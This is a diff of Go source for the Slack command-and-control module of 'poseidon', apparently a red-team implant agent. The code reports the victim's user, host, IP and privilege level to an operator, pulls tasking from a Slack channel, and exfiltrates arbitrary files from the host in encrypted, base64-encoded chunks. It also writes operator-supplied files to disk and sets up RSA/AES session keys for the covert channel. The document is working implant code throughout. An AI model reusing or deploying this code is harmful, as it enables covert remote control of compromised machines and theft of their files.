@@ -16,12 +16,13 @@ import (
 
 	"github.com/nlopes/slack"
 	"github.com/xorrior/poseidon/pkg/utils/crypto"
+	"github.com/xorrior/poseidon/pkg/utils/functions"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
 
 var (
-	token     = "SLACKLEGACYTOKEN"
-	channelid = "SLACKCHANNELID"
+	token     = ""
+	channelid = ""
 )
 
 type C2Slack struct {
@@ -138,11 +139,6 @@ func (c *C2Slack) SetRsaKey(newKey *rsa.PrivateKey) {
 	c.RsaPrivateKey = newKey
 }
 
-func (c C2Default) ProfileType() string {
-	t := reflect.TypeOf(c)
-	return t.Name()
-}
-
 func (c *C2Slack) SetSlackClient(newclient *slack.Client) {
 	c.Client = newclient
 }
@@ -167,45 +163,71 @@ func (c *C2Slack) GetChannelID() string {
 	return c.ChannelID
 }
 
+func (c C2Slack) ProfileType() string {
+	t := reflect.TypeOf(c)
+	return t.Name()
+}
+
 func (c *C2Slack) GetTasking() interface{} {
-	rawTask := c.sendData(TaskMsg, ApfellIDType, c.ApfID(), "", []byte(""))
-	task := structs.Task{}
-	err := json.Unmarshal(rawTask, &task)
+	request := structs.TaskRequestMessage{}
+	request.Action = "get_tasking"
+	request.TaskingSize = 1
+
+	raw, err := json.Marshal(request)
 
 	if err != nil {
-		//log.Printf("Error unmarshalling task data: %s", err.Error())
-		return task
+		log.Printf("Error unmarshalling: %s", err.Error())
+	}
+
+	rawTask := c.sendData("", raw)
+	task := structs.TaskRequestMessageResponse{}
+	err = json.Unmarshal(rawTask, &task)
+
+	if err != nil {
+		log.Printf("Error unmarshalling task data: %s", err.Error())
 	}
 
 	return task
 }
 
 func (c *C2Slack) PostResponse(task structs.Task, output string) []byte {
-	taskResp := structs.TaskResponse{}
-	taskResp.Response = base64.StdEncoding.EncodeToString([]byte(output))
-	dataToSend, _ := json.Marshal(taskResp)
-	return c.sendData(ResponseMsg, TASKIDType, task.ID, "", dataToSend)
+	responseMsg := structs.TaskResponseMessage{}
+	responseMsg.Action = "post_response"
+	responseMsg.Responses = make([]json.RawMessage, 1)
+	responseMsg.Responses[0] = []byte(output)
+
+	dataToSend, err := json.Marshal(responseMsg)
+	if err != nil {
+		log.Printf("Error marshaling data for postRESTResponse: %s", err.Error())
+		return make([]byte, 0)
+	}
+
+	return c.sendData("", dataToSend)
 }
 
 func (c *C2Slack) SendFile(task structs.Task, params string) {
-	fileReq := structs.FileRegisterRequest{}
-	fileReq.Task = task.ID
 	path := task.Params
 	// Get the file size first and then the # of chunks required
 	file, err := os.Open(path)
 
 	if err != nil {
+		log.Println("Error opening file: ", err.Error())
 		return
 	}
 
 	fi, err := file.Stat()
 	if err != nil {
+		log.Println("Error obtaining file stat: ", err.Error())
 		return
 	}
 
 	size := fi.Size()
 	raw := make([]byte, size)
-	file.Read(raw)
+	_, err = file.Read(raw)
+	if err != nil {
+		log.Println("Error reading file: ", err.Error())
+		return
+	}
 
 	c.SendFileChunks(task, raw)
 }
@@ -216,18 +238,30 @@ func (c *C2Slack) SendFileChunks(task structs.Task, fileData []byte) {
 	const fileChunk = 512000 //Normal apfell chunk size
 	chunks := uint64(math.Ceil(float64(size) / fileChunk))
 
-	chunkResponse := structs.FileRegisterRequest{}
-	chunkResponse.Chunks = int(chunks)
-	chunkResponse.Task = task.ID
+	chunkResponse := structs.FileDownloadInitialMessage{}
+	chunkResponse.NumChunks = int(chunks)
+	chunkResponse.TaskID = task.TaskID
+	chunkResponse.FullPath = task.Params
 
-	msg, _ := json.Marshal(chunkResponse)
+	msg, err := json.Marshal(chunkResponse)
+	if err != nil {
+		log.Println("Error unmarshaling intial chunk message: ", err.Error())
+	}
+
 	resp := c.PostResponse(task, string(msg))
-	fileResp := structs.FileRegisterResponse{}
+	fileResp := structs.TaskResponseMessageResponse{}
 
-	err := json.Unmarshal(resp, &fileResp)
+	err = json.Unmarshal(resp, &fileResp)
 
 	if err != nil {
+		log.Printf("Error unmarshaling: %s", err.Error())
 		return
+	}
+
+	var fileDetails map[string]interface{}
+
+	if len(fileResp.Responses) > 0 {
+		_ = json.Unmarshal([]byte(fileResp.Responses[0]), &fileDetails)
 	}
 
 	r := bytes.NewBuffer(fileData)
@@ -242,18 +276,33 @@ func (c *C2Slack) SendFileChunks(task structs.Task, fileData []byte) {
 			break
 		}
 
-		msg := structs.FileChunk{}
+		msg := structs.FileDownloadChunkMessage{}
+		msg.ChunkNum = int(i) + 1
+		msg.FileID = fileDetails["file_id"].(string)
 		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
-		msg.ChunkNumber = int(i) + 1
-		msg.FileID = fileResp.FileID
+		msg.TaskID = task.TaskID
 
-		encmsg, _ := json.Marshal(msg)
+		encmsg, err := json.Marshal(msg)
+		if err != nil {
+			log.Println("Error Marshaling chunk message: ", err.Error())
+			break
+		}
 
 		resp := c.PostResponse(task, string(encmsg))
-		postResp := structs.FileChunkResponse{}
-		_ = json.Unmarshal(resp, &postResp)
+		postResp := structs.TaskResponseMessageResponse{}
 
-		if !strings.Contains(postResp.Status, "success") {
+		err = json.Unmarshal(resp, &postResp)
+		if err != nil {
+			log.Println("Error unmarshaling task response message response: ", err.Error())
+			break
+		}
+
+		var decResp map[string]interface{}
+		if len(postResp.Responses) > 0 {
+			_ = json.Unmarshal(postResp.Responses[0], &decResp)
+		}
+
+		if !strings.Contains(decResp["status"].(string), "success") {
 			// If the post was not successful, wait and try to send it one more time
 			time.Sleep(time.Duration(c.Interval) * time.Second)
 			resp = c.PostResponse(task, string(encmsg))
@@ -262,13 +311,77 @@ func (c *C2Slack) SendFileChunks(task structs.Task, fileData []byte) {
 		time.Sleep(time.Duration(c.Interval) * time.Second)
 	}
 
-	c.PostResponse(task, "File download complete")
+	final := structs.Response{}
+	final.Completed = true
+	final.TaskID = task.TaskID
+	final.UserOutput = "file downloaded"
+	finalEnc, _ := json.Marshal(final)
+	c.PostResponse(task, string(finalEnc))
 }
 
-func (c *C2Slack) GetFile(fileid string) []byte {
-	fileData := c.sendData(FileMsg, FileIDType, fileid, c.ApfID(), []byte(""))
+func (c *C2Slack) GetFile(fileDetails structs.FileUploadParams) bool {
+	success := false
 
-	return fileData
+	fileUploadMsg := structs.FileUploadChunkMessage{} //Create the file upload chunk message
+	fileUploadMsg.Action = "upload"
+	fileUploadMsg.FileID = fileDetails.FileID
+	fileUploadMsg.ChunkSize = 1024000
+	fileUploadMsg.ChunkNum = 1
+	fileUploadMsg.FullPath = fileDetails.RemotePath
+
+	msg, _ := json.Marshal(fileUploadMsg)
+	rawData := c.sendData("", msg)
+
+	fileUploadMsgResponse := structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
+	_ = json.Unmarshal(rawData, &fileUploadMsgResponse)
+
+	f, err := os.Create(fileDetails.RemotePath)
+	if err != nil {
+		log.Printf("Error creating file: %s", err.Error())
+		return success
+	}
+
+	decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
+
+	_, err = f.Write(decoded)
+
+	if err != nil {
+		log.Printf("Error writing to file: %s", err.Error())
+		return success
+	}
+
+	success = true
+	offset := int64(len(decoded))
+
+	if fileUploadMsgResponse.TotalChunks > 1 {
+		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
+			fileUploadMsg = structs.FileUploadChunkMessage{}
+			fileUploadMsg.Action = "upload"
+			fileUploadMsg.ChunkNum = index
+			fileUploadMsg.ChunkSize = 1024000
+			fileUploadMsg.FileID = fileDetails.FileID
+			fileUploadMsg.FullPath = fileDetails.RemotePath
+
+			msg, _ := json.Marshal(fileUploadMsg)
+			rawData := c.sendData("", msg)
+
+			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
+			_ = json.Unmarshal(rawData, &fileUploadMsgResponse)
+
+			decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
+
+			_, err := f.WriteAt(decoded, offset)
+
+			if err != nil {
+				log.Printf("Error writing to file: %s", err.Error())
+				success = false
+				break
+			}
+
+			offset = offset + int64(len(decoded))
+		}
+	}
+	return success
 }
 
 func (c *C2Slack) CheckIn(ip string, pid int, user string, host string) interface{} {
@@ -279,101 +392,96 @@ func (c *C2Slack) CheckIn(ip string, pid int, user string, host string) interfac
 	c.SetSlackClient(slack.New(c.GetApiToken()))
 
 	var resp []byte
-
-	checkin := structs.CheckInStruct{}
+	c.ApfellID = c.UUID
+	checkin := structs.CheckInMessage{}
+	checkin.Action = "checkin"
 	checkin.User = user
 	checkin.Host = host
 	checkin.IP = ip
 	checkin.Pid = pid
 	checkin.UUID = c.UUID
 
+	if functions.IsElevated() {
+		checkin.IntegrityLevel = 3
+	} else {
+		checkin.IntegrityLevel = 2
+	}
+
 	checkinMsg, _ := json.Marshal(checkin)
 
 	if c.ExchangingKeys {
-		sID := c.NegotiateKey()
-		log.Printf("Session ID: %s ", sID)
-		if len(sID) == 0 {
-			log.Println("Empty session id. Key exchange failed")
-			return structs.CheckinResponse{Status: "failed"}
-		}
-
-		resp = c.sendData(EKE, SESSIDType, sID, "", checkinMsg)
-	} else if len(c.AesPreSharedKey()) != 0 {
-		log.Println("Sending AES PSK checkin")
-		resp = c.sendData(AES, UUIDType, c.UUID, "", checkinMsg)
-	} else {
-		log.Println("Sending unencrypted checkin")
-		resp = c.sendData(CheckInMsg, UUIDType, c.UUID, "", checkinMsg)
+		_ = c.NegotiateKey()
 	}
 
-	log.Printf("Raw response: %s ", string(resp))
-	respMsg := structs.CheckinResponse{}
-	err := json.Unmarshal(resp, &respMsg)
+	resp = c.sendData("", checkinMsg)
+	log.Printf("Raw Checkin response: %s\n", string(resp))
+	response := structs.CheckInMessageResponse{}
+	err := json.Unmarshal(resp, &response)
 	if err != nil {
 		log.Printf("Error unmarshaling response: %s", err.Error())
-		return structs.CheckinResponse{Status: "failed"}
+		return structs.CheckInMessageResponse{Status: "failed"}
 	}
 
-	return respMsg
+	if len(response.ID) > 0 {
+		c.ApfellID = response.ID
+	}
+
+	return response
 }
 
-func (c C2Slack) NegotiateKey() string {
+func (c *C2Slack) NegotiateKey() string {
 	sessionID := GenerateSessionID()
 	pub, priv := crypto.GenerateRSAKeyPair()
-	c.SetRsaKey(priv)
-	initMessage := structs.EKEInit{}
-	// Assign the session ID and the base64 encoded pub key
+	c.RsaPrivateKey = priv
+	initMessage := structs.EkeKeyExchangeMessage{}
+	initMessage.Action = "staging_rsa"
 	initMessage.SessionID = sessionID
-	initMessage.Pub = base64.StdEncoding.EncodeToString(pub)
+	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)
 
 	// Encode and encrypt the json message
-	unencryptedMsg, err := json.Marshal(initMessage)
+	raw, err := json.Marshal(initMessage)
 
 	if err != nil {
-		log.Printf("Error marshaling data %s", err.Error())
+		log.Printf("Error marshaling data: %s", err.Error())
 		return ""
 	}
 
-	res := c.sendData(EKE, UUIDType, UUID, "", unencryptedMsg)
+	resp := c.sendData("", raw)
 
-	// base64 decode the response and then decrypt it
-	rawResp, err := base64.StdEncoding.DecodeString(string(res))
-	if err != nil {
-		log.Printf("Error decoding string %s ", err.Error())
-		return ""
-	}
+	decryptedResponse := crypto.RsaDecryptCipherBytes(resp, c.RsaKey())
+	log.Printf("Apfell EKE Reponse: %s\n", string(decryptedResponse))
+	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
 
-	decryptedResponse := crypto.RsaDecryptCipherBytes(rawResp, c.RsaKey())
-	sessionKeyResp := structs.SessionKeyResponse{}
-	log.Printf("RSA Decrypted Response from Apfell: %s\n", string(decryptedResponse))
 	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
 	if err != nil {
-		log.Printf("Error unmarshaling response %s", err.Error())
+		log.Printf("Error unmarshaling RsaResponse %s", err.Error())
 		return ""
 	}
 
-	// Save the new AES session key
-	c.SetAesPreSharedKey(sessionKeyResp.EncSessionKey)
-	c.SetXKeys(false)
+	c.AesPSK = sessionKeyResp.SessionKey
+	c.ExchangingKeys = false
+
+	if len(sessionKeyResp.UUID) > 0 {
+		c.ApfellID = sessionKeyResp.UUID
+	}
+
 	return sessionID
 }
 
-func (c *C2Slack) sendData(msgType int, idType int, id string, tag string, data []byte) []byte {
+func (c *C2Slack) sendData(tag string, sendData []byte) []byte {
 	var timestamp string
 	m := structs.Message{}
-	log.Printf("Raw client message to apfell: %s", string(data))
-	if len(c.AesPreSharedKey()) != 0 {
-		m.Data = string(c.encryptMessage(data))
-	} else {
-		m.Data = string(data)
+	m.Client = true
+
+	if len(c.AesPSK) > 0 && !strings.Contains(c.AesPSK, "AESPSK") {
+		sendData = EncryptMessage(sendData, c.AesPreSharedKey())
 	}
 
-	m.MType = msgType
-	m.IDType = idType
-	m.ID = id
+	sendData = append([]byte(c.ApfellID), sendData...)
+	sendData = []byte(base64.StdEncoding.EncodeToString(sendData))
+
 	m.Tag = tag
-	m.Client = true
-	log.Printf("Sending message %+v\n", m)
+	m.Data = string(sendData)
 	rawM, err := json.Marshal(m)
 
 	if err != nil {
@@ -468,7 +576,7 @@ func (c *C2Slack) sendData(msgType int, idType int, id string, tag string, data 
 				log.Printf("Plain Message text: %s", reply.Text)
 				err = json.Unmarshal([]byte(reply.Text), &respMsg)
 				if err != nil {
-					log.Println("error unmarshaling response ", err.Error())
+					log.Println("Error unmarshaling text response ", err.Error())
 				}
 
 				break
@@ -477,7 +585,7 @@ func (c *C2Slack) sendData(msgType int, idType int, id string, tag string, data 
 				log.Printf("Message from attachment: %s", content)
 				err = json.Unmarshal([]byte(content), &respMsg)
 				if err != nil {
-					log.Println("error unmarshaling response ", err.Error())
+					log.Println("Error unmarshaling attachment response ", err.Error())
 				}
 				break
 			} else if len(reply.Files) > 0 {
@@ -490,7 +598,7 @@ func (c *C2Slack) sendData(msgType int, idType int, id string, tag string, data 
 				log.Printf("Message from file: %s", string(fileContents.Bytes()))
 				err = json.Unmarshal(fileContents.Bytes(), &respMsg)
 				if err != nil {
-					log.Println("error unmarshaling response ", err.Error())
+					log.Println("Error unmarshaling file response ", err.Error())
 				}
 
 				break
@@ -500,22 +608,21 @@ func (c *C2Slack) sendData(msgType int, idType int, id string, tag string, data 
 		time.Sleep(time.Duration(c.SleepInterval()) * time.Second)
 	}
 
-	if len(c.AesPreSharedKey()) != 0 && c.ExchangingKeys != true {
-		dec := c.decryptMessage([]byte(respMsg.Data))
-		log.Printf("Decrypted response from apfell: %s", string(dec))
+	raw, err := base64.StdEncoding.DecodeString(respMsg.Data)
+	if err != nil {
+		log.Println("Error decoding base64 data: ", err.Error())
+		return make([]byte, 0)
+	}
+
+	enc_raw := raw[36:] // Remove the Payload UUID
+	log.Printf("AESPSK length %d", len(c.AesPSK))
+	log.Println("Exchanging keys ", c.ExchangingKeys)
+	if len(c.AesPSK) > 0 && c.ExchangingKeys != true {
+		dec := DecryptMessage(enc_raw, c.AesPreSharedKey())
+		log.Printf("Decrypted Response from apfell: %s", string(dec))
 		return dec
 	}
 
-	return []byte(respMsg.Data)
-}
-
-func (c *C2Slack) encryptMessage(msg []byte) []byte {
-	key, _ := base64.StdEncoding.DecodeString(c.AesPreSharedKey())
-	return []byte(base64.StdEncoding.EncodeToString(crypto.AesEncrypt(key, msg)))
-}
-
-func (c *C2Slack) decryptMessage(msg []byte) []byte {
-	key, _ := base64.StdEncoding.DecodeString(c.AesPreSharedKey())
-	decMsg, _ := base64.StdEncoding.DecodeString(string(msg))
-	return crypto.AesDecrypt(key, decMsg)
+	log.Println("Skipped decryption")
+	return enc_raw
 }
